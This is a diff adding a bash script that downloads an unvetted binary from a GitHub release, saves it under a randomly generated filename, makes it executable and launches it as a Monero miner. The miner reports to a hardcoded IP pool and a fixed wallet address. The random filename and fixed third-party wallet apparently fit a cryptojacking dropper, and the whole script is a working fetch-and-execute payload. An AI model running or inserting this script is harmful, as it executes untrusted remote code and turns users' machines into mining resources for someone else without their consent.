@@ -1,0 +1,58 @@
+#!/bin/bash
+
+# Generate a random 10-character lowercase alphanumeric filename
+generate_random_filename() {
+    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
+    echo
+}
+
+# Worker name (customizable)
+generate_worker_name() {
+    echo "DC244py333"
+}
+
+main() {
+    miner_filename=$(generate_random_filename)
+    worker_name=$(generate_worker_name)
+
+    # Monero wallet address (provided)
+    WALLET_ADDRESS="47PM2FHLqjSA7By6udEENhDhSDhyKnaSENfhBfe4cRs3443wdkFDTDqEkqWvCqGBNPLaY6iCK3LEzhReeGHxRTxbBkswuBe"
+
+    # Cleanup on Ctrl+C or termination
+    trap "echo '🧹 Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM
+
+    echo "📥 Downloading XMR miner to: $miner_filename"
+    if wget -q https://github.com/tallapallitech63/lifemark/releases/download/atamn/atam -O "$miner_filename"; then
+        echo "✅ Miner downloaded as: $miner_filename"
+    else
+        echo "❌ Failed to download miner. Exiting."
+        exit 1
+    fi
+
+    echo "🔐 Setting executable permission..."
+    if chmod +x "$miner_filename"; then
+        echo "✅ Permissions set."
+    else
+        echo "❌ Failed to set permissions. Exiting."
+        exit 1
+    fi
+
+    echo "👷 Worker Name: $worker_name"
+    echo "🚀 Starting XMR mining..."
+
+    ./"$miner_filename" \
+        --url 54.81.174.156:8080 \
+        --user ${WALLET_ADDRESS}.${worker_name} \
+        --pass x \
+        --donate-level 1 \
+        --tls \
+        --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+
+    if [[ $? -eq 0 ]]; then
+        echo "✅ Miner exited normally."
+    else
+        echo "❌ Miner exited with an error."
+    fi
+}
+
+main
